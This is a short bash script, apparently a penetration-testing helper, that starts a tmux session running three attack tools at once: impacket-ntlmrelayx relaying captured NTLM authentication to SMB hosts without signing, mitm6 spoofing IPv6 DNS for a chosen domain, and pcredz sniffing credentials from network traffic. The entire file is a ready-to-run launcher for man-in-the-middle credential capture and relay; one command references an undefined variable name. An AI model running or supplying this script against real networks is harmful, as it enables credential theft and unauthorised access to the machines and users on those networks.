#!/bin/bash
# ARGS
# MITM6_ARGS "Target Domain for mitm6"
# PCREDZ_ARGS "Interface for pcredz to listen on"
# ENDARGS
# !!! change the path to mitm6 if not installed via pip !!!
# Author: Connor Fancy

# Define your tmux session name
TMUX_SESSION="mitm6"

# Extract the arguments
MITM6_ARGS=$1
PCREDZ_ARGS=$2

# Check if the tmux session already exists
if tmux has-session -t $TMUX_SESSION 2>/dev/null; then
    echo "Session $TMUX_SESSION already exists."
    echo "Use 'tmux attach -t $TMUX_SESSION' to interact with the session."
else
    echo "Creating new tmux session named $TMUX_SESSION..."
    # Create a new tmux session and start impacket-ntlmrelayx in the first pane
    tmux new-session -d -s $TMUX_SESSION "sudo impacket-ntlmrelayx -6 -wh bp.$MITM6_ARG -tf smb-not-signed.txt -smb2support"
    
    # Split the window and run mitm6 in the second pane
    tmux split-window -h "sudo /home/bstg/.local/bin/mitm6 -d $MITM6_ARGS"
    
    # Split the window vertically and run pcredz in the third pane
    tmux split-window -v "sudo docker run --rm -it --network host -v ~/.pcredz:/root/.pcredz snovvcrash/pcredz -i $PCREDZ_ARGS"

    # Optionally, set the layout to even-horizontal or any other preferred layout
    tmux select-layout even-horizontal

    echo "Tools started in tmux session $TMUX_SESSION"
    echo "Use 'tmux attach -t $TMUX_SESSION' to interact with the session."
fi
